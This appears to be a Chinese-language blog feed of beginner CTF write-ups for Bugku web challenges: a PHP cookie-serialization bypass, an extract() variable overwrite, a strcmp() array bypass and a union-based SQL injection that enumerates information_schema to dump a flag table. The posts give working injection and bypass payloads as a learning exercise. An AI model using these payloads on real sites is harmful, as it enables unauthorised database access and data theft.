placeholder&#x3D;&quot;Username&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name&#x3D;&quot;password&quot; type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;Password&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input value&#x3D;&quot;Login&quot; type&#x3D;&quot;button&quot;&#x2F;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">$KEY&#x3D;&#39;ISecer:www.isecer.com&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>之后我们查看开头的代码<br>发现要将cookie指进行序列化后<br>使与key值相等即可得到flag<br>但是<br>注意：下方的key值并不是我们需要的<br>而我们需要的key值在程序中并没有赋值<br>因此为NULL<br>所以有</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$KEY&#x3D;&quot;&quot;;</span><br><span class="line">print(serialize($KEY));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>因为我们并没有对$key进行赋值因此求序列化的程序如上所示<br>之后我们可以使用火狐上的hackbar<br>上传cookies<br>即ISecer=s:0:””%3b<br>因为；无法上传 ， 因此我们使用其的url码上传<br>注意，上传的时候要在没有get  hint的页面中进行<br>否则无法显示flag</p>
<p>萌新  还请大佬指教<br>邮箱：<a href="mailto:497710073@qq.com">497710073@qq.com</a></p>
]]></content>
  </entry>
  <entry>
    <title>extract（）变量漏洞</title>
    <url>/2019/12/16/extract%EF%BC%88%EF%BC%89%E5%8F%98%E9%87%8F%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="php代码审计日志一（bugku-extract变量覆盖）"><a href="#php代码审计日志一（bugku-extract变量覆盖）" class="headerlink" title="php代码审计日志一（bugku  extract变量覆盖）"></a>php代码审计日志一（bugku  extract变量覆盖）</h2><a id="more"></a>

<p>题目来源：bugku<br>代码为：<br><img src="https://img-blog.csdnimg.cn/20190309083831775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">我们先了解一下extract（）函数<br><img src="https://img-blog.csdnimg.cn/20190309083932380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">之后我们再了解一下php中的extract（）漏洞</p>
<p><img src="https://img-blog.csdnimg.cn/2019030908412227.png" alt="在这里插入图片描述"><br>第一次我所构造的为：<br>?shiyan=1&amp;flag=1<br>但是不行<br>我查了一些大佬的wp后发现有：<br><img src="https://img-blog.csdnimg.cn/20190309084444350.png" alt="在这里插入图片描述">之后我们就可以得到flag</p>
]]></content>
  </entry>
  <entry>
    <title>csdn_export_md</title>
    <url>/2019/12/16/csdn_export_md/</url>
    <content><![CDATA[<h2 id="代码审计之strcmp（）漏洞"><a href="#代码审计之strcmp（）漏洞" class="headerlink" title="代码审计之strcmp（）漏洞"></a>代码审计之strcmp（）漏洞</h2><a id="more"></a>

<p>先了解一下此漏洞：<br><strong>strcmp(str1,str2)比较两个字符串，如果相等就返回0。</strong></p>
<p>在5.3版本前，如果传入的不是字符串，那么会报错，并且return 0，返回0就代表相等了。<br>绕过strcmp就想办法传入数组吧，只需要v3[]=3即可。</p>
<p>之后我们通过一个题来做一个例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&#123;xxxxx&#125;&quot;;</span><br><span class="line">if (isset($_GET[&#39;a&#39;])) &#123;</span><br><span class="line">if (strcmp($_GET[&#39;a&#39;], $flag) &#x3D;&#x3D; 0) &#x2F;&#x2F;如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span><br><span class="line">&#x2F;&#x2F;比较两个字符串（区分大小写）</span><br><span class="line">die(&#39;Flag: &#39;.$flag);</span><br><span class="line">else</span><br><span class="line">print &#39;No&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>因此我们可以构造<br>?a[]=1<br>即可得到flag</p>
]]></content>
  </entry>
  <entry>
    <title>bugku成绩单</title>
    <url>/2019/12/16/bugku%E6%88%90%E7%BB%A9%E5%8D%95/</url>
    <content><![CDATA[<h2 id="bugku成绩单-详细解析"><a href="#bugku成绩单-详细解析" class="headerlink" title="bugku成绩单  详细解析"></a>bugku成绩单  详细解析</h2><a id="more"></a>

<p>1，我们首先分别输入1,2,3，<br>均有输出<br>我们输入1’<br>没有回响<br>因此我们可以判断存在sql注入<br>2.我们分别输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; order by 1#</span><br><span class="line">1&#39; order by 2#</span><br><span class="line">1&#39; order by 3#</span><br><span class="line">1&#39; order by 4#</span><br></pre></td></tr></table></figure>
<p>均有回响<br>但是当我们使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; order by 5#</span><br></pre></td></tr></table></figure>
<p>时，没有回响<br>因此我们可以根据此判断字段数为4<br>3，<br>之后就是最精彩的地方了<br>之后我们联合查询<br>我们先输入<br>注意（select好像tm的不是查询，，好像是赋值。。）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select 1,2,3,4#</span><br></pre></td></tr></table></figure>
<p>没有显示有用的东西<br>因为id=1  所以我们的东西被覆盖<br>因此呢<br>我们输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5&#39; union select 1,2,3,database()#</span><br></pre></td></tr></table></figure>
<p>即设置一个新的id，我们要select的值会显示在表上（覆盖）<br><img src="https://img-blog.csdnimg.cn/20190309162426694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>现在我们得到了一个数据库的名字<br>之后就进行爆表<br>5’union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#<br>得到<br><img src="https://img-blog.csdnimg.cn/20190309163625472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">之后再进行获得里面的列<br>‘ union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=’fl4g’#<br>得到<br><img src="https://img-blog.csdnimg.cn/20190309164001253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">我们得到了列<br>之后我们获取我们要得到的东西<br>5’ union select 1,2,3,skctf_flag from fl4g#<br><img src="https://img-blog.csdnimg.cn/20190309164216346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">得到flag</p>
<p>之后我会写一些关于sql语句的总结</p>
]]></content>
  </entry>
</search>
